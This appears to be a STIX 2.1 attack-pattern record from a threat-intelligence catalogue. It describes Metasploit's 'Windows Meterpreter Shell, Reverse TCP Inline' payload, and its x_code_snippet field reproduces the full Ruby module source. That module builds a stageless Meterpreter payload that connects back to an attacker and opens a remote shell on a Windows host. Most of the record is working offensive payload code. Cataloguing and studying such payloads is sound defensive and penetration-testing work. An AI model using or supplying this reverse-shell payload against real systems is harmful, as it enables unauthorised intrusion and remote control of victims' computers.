{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e968466-dfad-4af7-abd0-0ebfd1659e50",
    "created": "2024-08-14T16:33:19.375134Z",
    "modified": "2024-08-14T16:33:19.375138Z",
    "name": "Windows Meterpreter Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/meterpreter_reverse_tcp.rb",
            "external_id": "meterpreter_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 175686\n\n  include Msf::Payload::TransportConfig\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n  include Msf::Payload::Windows::MeterpreterLoader\n  include Msf::Sessions::MeterpreterOptions\n\n  def initialize(info = {})\n\n    super(merge_info(info,\n      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline',\n      'Description' => 'Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',\n      'Author'      => [ 'OJ Reeves' ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_X86,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Session'     => Msf::Sessions::Meterpreter_x86_Win\n      ))\n\n    register_options([\n      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),\n      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),\n    ])\n  end\n\n  def generate(opts={})\n    opts[:stageless] = true\n    stage_meterpreter(opts) + generate_config(opts)\n  end\n\n  def generate_config(opts={})\n    opts[:uuid] ||= generate_payload_uuid\n\n    # create the configuration block, which for staged connections is really simple.\n    config_opts = {\n      arch:       opts[:uuid].arch,\n      exitfunk:   datastore['EXITFUNC'],\n      expiration: datastore['SessionExpirationTimeout'].to_i,\n      uuid:       opts[:uuid],\n      transports: [transport_config_reverse_tcp(opts)],\n      extensions: (datastore['EXTENSIONS'] || '').split(','),\n      ext_init:   (datastore['EXTINIT'] || ''),\n      stageless:  true,\n    }.merge(meterpreter_logging_config(opts))\n\n    # create the configuration instance based off the parameters\n    config = Rex::Payloads::Meterpreter::Config.new(config_opts)\n\n    # return the binary version of it\n    config.to_b\n  end\nend\n\n",
    "x_mitre_platforms": [
        "win'"
    ]
}